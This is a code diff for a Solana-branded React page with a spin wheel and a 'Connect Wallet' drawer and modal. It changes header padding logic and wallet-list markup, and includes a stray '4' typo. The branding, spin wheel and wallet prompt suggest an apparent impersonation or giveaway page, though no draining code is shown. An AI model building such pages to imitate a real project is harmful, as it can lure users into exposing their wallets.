@@ -45,23 +45,15 @@ export default function Page() {
   }, [])
 
 
-/* ——— Dinamik üst boşluk durumu ——— */
-const [topOffset, setTopOffset] = useState<string>('8px')
-const [showOffset, setShowOffset] = useState<boolean>(false)
-
-useEffect(() => {
-  const update = () => {
+    /* ——— Dinamik üst boşluk durumu ——— */
+  const [topOffset, setTopOffset] = useState<string>('20px')
+  useEffect(() => {
     const isTelegram = !!(window as any).Telegram?.WebApp
-    const w          = window.innerWidth
-    // Telegram dışında ve 320–499px arasındaysa offset uygula
-    const shouldShow = !isTelegram && w >= 320 && w <= 499
-    setShowOffset(shouldShow)
-    setTopOffset(shouldShow ? '8px' : '')
-  }
-  update()
-  window.addEventListener('resize', update)
-  return () => window.removeEventListener('resize', update)
-}, [])
+    const w = window.innerWidth
+    if (!isTelegram && w >= 320 && w <= 499) {
+      setTopOffset('8px')
+    }
+  }, [])
 
 
   /* ——— Çark (spin) durumu ——— */
@@ -278,7 +270,7 @@ useEffect(() => {
 
 
       return (
-        <div style={showOffset ? { paddingTop: topOffset } : undefined}>
+        <>
           {/* ---------- HERO BANNER ---------- */}
           <div className="_1">
             <div className="_g">
@@ -302,45 +294,49 @@ useEffect(() => {
             </div>
           </div>
 
-          {/* ---------- HEADER ---------- */}
-          <section className="_b">
-            <div className="_d">
-              <div className="_x">
-                <div className="_0">
-                  <a href="#!" className="_h">
-                    <img src="/header_logo.svg" alt="Solana logo" />
-                  </a>
-                  <a href="#!" className="_w">
-                    <img src="/alik.png" className="_t" alt="avatar" />
-                  </a>
-                </div>
-                <div className="_0">
-                  <div className="_6">
-                    <a href="https://x.com/solana?mx=2" target="_blank" rel="noreferrer">
-                      <img src="/header_twitter.svg" alt="Twitter" />
-                    </a>
-                    <a href="https://t.me/solana" target="_blank" rel="noreferrer">
-                      <img src="/header_tg.svg" alt="Telegram" />
-                    </a>
-                    <a href="https://www.youtube.com/SolanaFndn" target="_blank" rel="noreferrer">
-                      <img src="/header_mail.svg" alt="YouTube" />
-                    </a>
-                    <a href="https://discord.com/invite/kBbATFA7PW" target="_blank" rel="noreferrer">
-                      <img src="/header_ds.svg" alt="Discord" />
-                    </a>
-                  </div>
-                </div>
-                <div className="_0">
-                  <button onClick={handleConnect} className="_n">
-                    <span className="_a">
-                      {publicKey ? 'Wallet connected' : 'Connect Wallet'}
-                    </span>
-                    <img src="/header_arrow.svg" alt="→" />
-                  </button>
-                </div>
-              </div>
+    {/* ---------- HEADER ---------- */}
+    <section className="_b">
+      <div
+        className="_d"
+        style={topOffset ? { paddingTop: topOffset } : undefined}
+      >
+        <div className="_x">
+          <div className="_0">
+            <a href="#!" className="_h">
+              <img src="/header_logo.svg" alt="Solana logo" />
+            </a>
+            <a href="#!" className="_w">
+              <img src="/alik.png" className="_t" alt="avatar" />
+            </a>
+          </div>
+          <div className="_0">
+            <div className="_6">
+              <a href="https://x.com/solana?mx=2" target="_blank" rel="noreferrer">
+                <img src="/header_twitter.svg" alt="Twitter" />
+              </a>
+              <a href="https://t.me/solana" target="_blank" rel="noreferrer">
+                <img src="/header_tg.svg" alt="Telegram" />
+              </a>
+              <a href="https://www.youtube.com/SolanaFndn" target="_blank" rel="noreferrer">
+                <img src="/header_mail.svg" alt="YouTube" />
+              </a>
+              <a href="https://discord.com/invite/kBbATFA7PW" target="_blank" rel="noreferrer">
+                <img src="/header_ds.svg" alt="Discord" />
+              </a>
             </div>
-          </section>
+          </div>
+          <div className="_0">
+            <button onClick={handleConnect} className="_n">
+              <span className="_a">
+                {publicKey ? 'Wallet connected' : 'Connect Wallet'}
+              </span>
+              <img src="/header_arrow.svg" alt="→" />
+            </button>
+          </div>
+        </div>
+      </div>
+    </section>
+
 
           {/* ---------- MAIN SECTION ---------- */}
           <section className="_m">
@@ -402,10 +398,33 @@ useEffect(() => {
               leaveTo="translate-y-full"
               className="connect-sheet md:hidden"
             >
-              {/* … aynı içeriğiniz … */}
+              <div className="connect-header">
+                <h2 className="connect-title">Connect Wallet</h2>
+                <button className="connect-close" onClick={closeDrawer}>×</button>
+              </div>
+              <div className="connect-list">
+                {orderedWallets.map(w => (
+                  <div
+                    key={w.adapter.name}
+                    className="connect-row"
+                    onClick={() => handleWalletClick(w)}
+                  >
+                    <div className="connect-icon">
+                      <img src={w.icon} alt={w.label} />
+                    </div>
+                    <span className="connect-text">{w.label}</span>
+                  </div>
+                ))}
+              </div>
+              <p className="connect-footer">
+                Haven’t got a wallet?{' '}
+                <a href="https://solana.com/wallets" target="_blank">
+                  Get started
+                </a>
+              </p>
             </Transition.Child>
 
-            {/* desktop modal */}
+            {/* desktop centered modal */}
             <Transition.Child
               as="div"
               enter="transition-opacity duration-200"
@@ -416,9 +435,34 @@ useEffect(() => {
               leaveTo="opacity-0"
               className="hidden md:flex fixed inset-0 z-50 items-center justify-center bg-black/40"
             >
-              {/* … aynı içeriğiniz … */}
+              <div className="drawer-card space-y-4">
+                <div className="connect-header">
+                  <h2 className="connect-title">Connect Wallet</h2>
+                  <button className="connect-close" onClick={closeDrawer}>×</button>
+                </div>
+                <div className="connect-list">
+                  {orderedWallets.map(w => (
+                    <div
+                      key={w.adapter.name}
+                      className="connect-row"
+                      onClick={() => handleWalletClick(w)}
+                    >
+                      <div className="connect-icon">4
+                        <img src={w.icon} alt={w.label} />
+                      </div>
+                      <span className="connect-text">{w.label}</span>
+                    </div>
+                  ))}
+                </div>
+                <p className="connect-footer">
+                  Haven’t got a wallet?{' '}
+                  <a href="https://solana.com/wallets" target="_blank">
+                    Get started
+                  </a>
+                </p>
+              </div>
             </Transition.Child>
           </Transition>
-        </div>
+        </>
       )
 }
